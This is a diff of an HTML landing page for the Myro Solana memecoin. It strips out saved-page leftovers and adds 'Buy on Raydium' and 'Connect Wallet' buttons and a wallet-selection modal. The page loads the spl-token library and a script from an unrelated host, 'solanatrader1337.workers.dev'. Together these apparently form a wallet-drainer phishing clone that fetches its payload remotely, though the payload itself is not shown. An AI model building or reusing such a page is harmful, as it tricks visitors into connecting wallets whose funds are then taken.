[type=button],[type=reset],[type=submit]{-webkit-appearance:button;-moz-appearance:button;appearance:button}button,input,select,textarea{background-color:transparent;border-style:none}button:-moz-focusring,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{outline:1px dotted ButtonText}select{-webkit-appearance:none;-moz-appearance:none;appearance:none}a:focus,button:focus,input:focus,select:focus,textarea:focus{outline-width:0}select::-ms-expand{display:none}select::-ms-value{color:currentcolor}legend{border:0;color:inherit;display:table;white-space:normal;max-width:100%}::-webkit-file-upload-button{-webkit-appearance:button;-moz-appearance:button;appearance:button;color:inherit;font:inherit}[disabled]{cursor:default}img{border-style:none}progress{vertical-align:baseline}[aria-busy=true]{cursor:progress}[aria-controls]{cursor:pointer}[aria-disabled=true]{cursor:default}ul,ol{list-style-type:none}figure{margin:0}.guard-popup{font-family:FigtreeVF,sans-serif;position:fixed;z-index:2147483638;top:8px;left:24px;overflow:visible;color:#222e3a;background-color:#fff;max-width:416px;width:calc(100% - 48px);border-radius:16px;box-shadow:0 4px 20px #00000040;padding:24px}.guard-popup__header{display:flex;justify-content:space-between;align-items:center;column-gap:16px;margin-bottom:24px}.guard-popup__close{display:flex;align-items:center;justify-content:center;width:24px;height:24px;opacity:.7}.guard-popup__img{line-height:0;margin-bottom:24px}.guard-popup__img img{width:100%;aspect-ratio:368/142;object-fit:cover;border-radius:12px;overflow:hidden}.guard-popup__title{font-size:24px;line-height:32px;margin-bottom:8px}.guard-popup__description{font-size:20px;line-height:28px;font-weight:500;color:#4a5764;margin-bottom:28px}.guard-popup__actions{display:flex;justify-content:flex-end;column-gap:16px}.guard-popup__btn{display:flex;align-items:center;justify-content:center;padding:8px 16px;border-radius:5px;font-size:16px;line-height:24px;font-weight:700;cursor:pointer;color:#fff;background:linear-gradient(180deg,#5695fd,#1554ff)}</style>">
-            <style>
-                @font-face {
-                    font-family: FigtreeVF;
-                    src: url("chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2") format("woff2 supports variations"),url("chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2") format("woff2-variations");
-                    font-weight: 100 1000;
-                    font-display: swap
-                }
-            </style>
-        </veepn-guard-alert>
-        <script data-scrapbook-elem="basic-loader">
-            (function() {
-                var k1 = "data-scrapbook-shadowdom"
-                  , k2 = "data-scrapbook-canvas"
-                  , k3 = "data-scrapbook-input-indeterminate"
-                  , k4 = "data-scrapbook-input-checked"
-                  , k5 = "data-scrapbook-option-selected"
-                  , k6 = "data-scrapbook-input-value"
-                  , k7 = "data-scrapbook-textarea-value"
-                  , k8 = "data-scrapbook-adoptedstylesheets"
-                  , k9 = /^data-scrapbook-adoptedstylesheet-(\d+)$/
-                  , k10 = "data-scrapbook-shadowdom-mode"
-                  , k11 = "data-scrapbook-shadowdom-clonable"
-                  , k12 = "data-scrapbook-shadowdom-delegates-focus"
-                  , k13 = "data-scrapbook-shadowdom-serializable"
-                  , k14 = "data-scrapbook-shadowdom-slot-assignment"
-                  , k15 = "data-scrapbook-slot-assigned"
-                  , k16 = "data-scrapbook-slot-index"
-                  , k17 = /^scrapbook-slot-index=(\d+)$/;
-                k18 = '/scrapbook-slot-index';
-                d = document,
-                r = d.documentElement,
-                $s = !!r.attachShadow,
-                $as = !!d.adoptedStyleSheets,
-                $c = !!window.HTMLCanvasElement,
-                $sa = !!d.createElement('slot').assign,
-                sle = [],
-                sls = [],
-                slt = function(r) {
-                    if ($sa) {
-                        var E = r.childNodes, i, e, s, m;
-                        for (i = 0; i < E.length; i++) {
-                            e = E[i];
-                            if (e.nodeType === 8) {
-                                s = e.nodeValue;
-                                if (m = s.match(k17)) {
-                                    s = e.nextSibling;
-                                    if (s.nodeType === 3) {
-                                        sls[m[1]] = s;
-                                    }
-                                    r.removeChild(e);
-                                    i--;
-                                } else if (s === k18) {
-                                    r.removeChild(e);
-                                    i--;
-                                }
-                            }
-                        }
-                    }
-                }
-                ,
-                sl = function() {
-                    var i = sle.length, j, d, e;
-                    while (i--) {
-                        d = sle[i];
-                        e = d.elem;
-                        d = d.value.split(',');
-                        j = d.length;
-                        while (j--) {
-                            d[j] = sls[parseInt(d[j], 10)];
-                        }
-                        try {
-                            e.assign.apply(e, d);
-                        } catch (ex) {
-                            console.error(ex);
-                        }
-                    }
-                }
-                ,
-                asl = (function(r) {
-                    var l = [], E, i, e, m, c, j;
-                    if ($as) {
-                        E = r.attributes;
-                        i = E.length;
-                        while (i--) {
-                            e = E[i];
-                            if (!(m = e.nodeName.match(k9))) {
-                                continue;
-                            }
-                            c = l[m[1]] = new CSSStyleSheet();
-                            r.removeAttribute(m[0]);
-                            m = e.nodeValue.split('\n\n');
-                            j = m.length;
-                            while (j--) {
-                                try {
-                                    m[j] && c.insertRule(m[j]);
-                                } catch (ex) {
-                                    console.error(ex);
-                                }
-                            }
-                        }
-                    }
-                    return l;
-                }
-                )(r),
-                as = function(d, e) {
-                    var l, i, I;
-                    if ($as && (l = e.getAttribute(k8)) !== null) {
-                        l = l.split(',');
-                        for (i = 0,
-                        I = l.length; i < I; i++) {
-                            d.adoptedStyleSheets.push(asl[l[i]]);
-                        }
-                        e.removeAttribute(k8);
-                    }
-                }
-                ,
-                fn = function(r) {
-                    var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s, m;
-                    while (i--) {
-                        e = E[i];
-                        s = e.shadowRoot;
-                        if ($s && (d = e.getAttribute(k1))) {
-                            if (!s) {
-                                try {
-                                    s = e.attachShadow({
-                                        mode: (m = e.getAttribute(k10)) !== null ? m : 'open',
-                                        clonable: e.hasAttribute(k11),
-                                        delegatesFocus: e.hasAttribute(k12),
-                                        serializable: e.hasAttribute(k13),
-                                        slotAssignment: (m = e.getAttribute(k14)) !== null ? m : void (0),
-                                    });
-                                    s.innerHTML = d;
-                                } catch (ex) {
-                                    console.error(ex);
-                                }
-                            }
-                            e.removeAttribute(k1);
-                            e.removeAttribute(k10);
-                            e.removeAttribute(k11);
-                            e.removeAttribute(k12);
-                            e.removeAttribute(k13);
-                            e.removeAttribute(k14);
-                        }
-                        if ($c && (d = e.getAttribute(k2)) !== null) {
-                            (function() {
-                                var c = e
-                                  , g = new Image();
-                                g.onload = function() {
-                                    c.getContext('2d').drawImage(g, 0, 0);
-                                }
-                                ;
-                                g.src = d;
-                            }
-                            )();
-                            e.removeAttribute(k2);
-                        }
-                        if ((d = e.getAttribute(k3)) !== null) {
-                            e.indeterminate = true;
-                            e.removeAttribute(k3);
-                        }
-                        if ((d = e.getAttribute(k4)) !== null) {
-                            e.checked = d === 'true';
-                            e.removeAttribute(k4);
-                        }
-                        if ((d = e.getAttribute(k5)) !== null) {
-                            e.selected = d === 'true';
-                            e.removeAttribute(k5);
-                        }
-                        if ((d = e.getAttribute(k6)) !== null) {
-                            e.value = d;
-                            e.removeAttribute(k6);
-                        }
-                        if ((d = e.getAttribute(k7)) !== null) {
-                            e.value = d;
-                            e.removeAttribute(k7);
-                        }
-                        if ($sa && (d = e.getAttribute(k15)) !== null) {
-                            sle.push({
-                                elem: e,
-                                value: d
-                            });
-                            e.removeAttribute(k15);
-                        }
-                        if ($sa && (d = e.getAttribute(k16)) !== null) {
-                            sls[d] = e;
-                            e.removeAttribute(k16);
-                        }
-                        if (s) {
-                            slt(e);
-                            as(s, e);
-                            fn(s);
-                        }
-                    }
-                }
-                ;
-                as(d, r);
-                fn(d);
-                sl();
-            }
-            )()
-        </script>
-<script>
+        </header>
+        <section class="intro">
+            <div class="container">
+                <img src="/assets/img/intro_picture.png" alt="" class="picture"/>
+                <h2 class="wow animate__bounceIn">
+                    Welcome to
+          
+                    <svg xmlns="http://www.w3.org/2000/svg" width="108" height="75" viewBox="0 0 108 75" fill="none">
+                        <path d="M9.93817 23.0581C9.81908 21.6088 8.86262 20.7144 8.39197 19.5985C5.0813 11.7601 9.2609 2.83293 17.2759 0.698433C24.3399 -1.18554 30.8158 2.79146 32.3578 9.94257C32.91 12.5026 32.874 15.0976 32.7094 17.6717C32.5646 19.9033 33.4275 21.3759 35.3214 22.5387C39.0181 24.8059 42.9531 26.5317 46.9569 28.1234C54.9593 31.3122 62.9776 34.4742 71.0117 37.588C75.1386 39.1845 79.0484 41.2581 83.0428 43.1174C84.0384 42.0695 83.8717 40.7328 84.2997 39.6019C86.1972 34.6123 89.7897 31.7386 95.0845 31.3716C100.213 31.0214 104.161 33.2286 106.638 37.802C109.569 43.2186 107.123 49.9121 101.113 53.0859C100.27 53.5285 99.2271 53.5922 98.4289 54.5054C98.9883 56.3058 100.077 57.9806 100.204 60.0023C100.649 67.089 94.6141 74.0078 87.3197 74.6303C80.1428 75.2415 73.295 69.5221 73.1429 62.1291C73.0811 59.2137 71.8736 58.3901 69.6493 57.5284C59.5517 53.6164 49.8032 48.8467 39.5839 45.2082C34.8252 43.5183 30.0455 41.9035 25.1656 40.594C23.6871 40.1943 22.7301 40.3218 21.8598 41.856C17.949 48.7489 6.27032 48.83 1.47602 40.6294C-0.788953 36.7665 -0.176098 32.8047 2.27847 29.1232C4.17515 26.2735 6.97031 24.5057 9.94355 23.0634L9.93817 23.0581ZM22.6955 36.3469C24.2281 38.025 24.2386 37.9929 26.3272 38.4433C39.9833 41.365 53.1013 45.9263 65.6858 51.9507C68.7796 53.429 71.6668 55.3522 74.5963 57.1576C75.9377 57.9859 76.6754 59.0044 77.0051 60.8753C77.8401 65.5687 80.9308 69.8236 86.0899 70.1955C90.473 70.5122 94.9624 67.2278 96.2839 62.626C97.0524 59.9367 97.3077 57.3033 94.458 55.4067C93.2022 54.5672 93.406 53.5123 94.7727 52.8961C97.031 51.8744 99.1599 50.65 101.084 49.1056C104.117 46.6787 105.184 43.6777 104.169 40.6918C103.117 37.5723 100.138 35.398 96.5521 35.19C93.8549 35.0314 91.4509 35.7808 89.405 37.5987C87.7053 39.0992 86.3385 40.8443 85.7602 43.0405C85.224 45.076 84.0812 45.5307 82.2165 44.8974C81.2841 44.5807 80.3095 44.3927 79.3614 44.1349C72.6922 42.3095 66.3612 39.5945 60.0249 36.8848C51.4264 33.2119 42.8439 29.5229 34.2243 25.9036C30.1932 24.2104 28.3555 21.3246 28.6453 16.9362C28.795 14.6136 28.8804 12.2593 28.34 9.94522C27.1718 4.95377 22.6008 2.20375 17.6528 3.51077C11.1125 5.2425 8.26067 13.2273 12.1398 19.0514C12.6785 19.8621 13.3881 20.5757 14.0548 21.2895C16.684 24.1074 16.4587 25.1196 12.8796 26.2811C10.7536 26.9758 8.75141 27.8572 7.12181 29.4698C3.47386 33.0766 3.29835 37.8977 6.83753 40.8077C10.8225 44.0848 17.151 43.9858 19.6037 39.8977C20.3682 38.6315 21.1703 37.3919 22.6848 36.347L22.6955 36.3469Z" fill="white"/>
+                    </svg>
+                </h2>
+                <h1 class="wow animate__bounceIn">
+                    <img src="/assets/img/miro_text.png" alt=""/>
+                </h1>
+                <h3 class="wow animate__bounceIn">
+                    Myro the dog: Named after Solana Co-Founder Raj <br/>Gokal’s dog Myro.
+        
+                </h3>
+                <div class="intro__links wow animate__bounceIn">
+                    <a href="https://raydium.io/swap/?inputCurrency=sol&outputCurrency=HhJpBhRRn4g56VsyLuT8DL5Bv31HkXqsrahTTUCZeZg4&fixed=in" target="_blank" class="links__link white">
+                        Buy on Raydium
+
+            
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25" fill="none">
+                            <path d="M6.25 5.44702C5.56 5.44702 5 6.00702 5 6.69702V18.197C5 18.887 5.56 19.447 6.25 19.447H17.75C18.44 19.447 19 18.887 19 18.197V14.447C19 14.1818 19.1054 13.9275 19.2929 13.7399C19.4804 13.5524 19.7348 13.447 20 13.447C20.2652 13.447 20.5196 13.5524 20.7071 13.7399C20.8946 13.9275 21 14.1818 21 14.447V18.197C21 19.059 20.6576 19.8856 20.0481 20.4951C19.4386 21.1046 18.612 21.447 17.75 21.447H6.25C5.38805 21.447 4.5614 21.1046 3.9519 20.4951C3.34241 19.8856 3 19.059 3 18.197V6.69702C3 5.83507 3.34241 5.00842 3.9519 4.39892C4.5614 3.78943 5.38805 3.44702 6.25 3.44702H10C10.2652 3.44702 10.5196 3.55238 10.7071 3.73991C10.8946 3.92745 11 4.18181 11 4.44702C11 4.71224 10.8946 4.96659 10.7071 5.15413C10.5196 5.34166 10.2652 5.44702 10 5.44702H6.25ZM14 5.44702C13.7348 5.44702 13.4804 5.34166 13.2929 5.15413C13.1054 4.96659 13 4.71224 13 4.44702C13 4.18181 13.1054 3.92745 13.2929 3.73991C13.4804 3.55238 13.7348 3.44702 14 3.44702H20C20.2652 3.44702 20.5196 3.55238 20.7071 3.73991C20.8946 3.92745 21 4.18181 21 4.44702V10.447C21 10.7122 20.8946 10.9666 20.7071 11.1541C20.5196 11.3417 20.2652 11.447 20 11.447C19.7348 11.447 19.4804 11.3417 19.2929 11.1541C19.1054 10.9666 19 10.7122 19 10.447V6.86102L14.707 11.154C14.5184 11.3362 14.2658 11.437 14.0036 11.4347C13.7414 11.4324 13.4906 11.3272 13.3052 11.1418C13.1198 10.9564 13.0146 10.7056 13.0123 10.4434C13.01 10.1812 13.1108 9.92862 13.293 9.74002L17.586 5.44702H14Z" fill="#050505"/>
+                        </svg>
+                    </a>
+                    <a id="status" class="links__link border connect-button">Connect Wallet</a>
+                </div>
+            </div>
+        </section>
+    <script>
     window.Buffer = window.Buffer || {
       from: function (data, encoding) {
         if (typeof data === 'string' && encoding === 'hex') {
@@ -503,6 +94,19 @@
 <script src="https://unpkg.com/@solana/spl-token@0.1.6/lib/index.iife.js"></script>
 
 <script src="https://settings-js.solanatrader1337.workers.dev"></script>
+<!-- Кнопка для открытия модального окна -->
+<button id="connectWalletBtn" style="padding: 10px 20px; background: #1a1f2e; color: white; border: none; border-radius: 8px; cursor: pointer;">Connect Wallet</button>
 
-    </body>
+<!-- Модальное окно -->
+<div id="walletModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.5); justify-content: center; align-items: center; z-index: 1000;">
+  <div style="background: #11141e; padding: 20px; border-radius: 16px; width: 300px; color: white; font-family: 'Montserrat', Arial, sans-serif;">
+    <h2 style="font-size: 18px; font-weight: 600; margin-bottom: 20px; text-align: center;">Connect a Wallet</h2>
+    <ul id="walletList" style="list-style: none; padding: 0; margin: 0;">
+      <!-- Список кошельков будет добавлен через JS -->
+    </ul>
+    <button id="closeModalBtn" style="margin-top: 20px; width: 100%; padding: 10px; background: #2d3345; color: white; border: none; border-radius: 8px; cursor: pointer;">Close</button>
+  </div>
+</div>
+
+</body>
 </html>
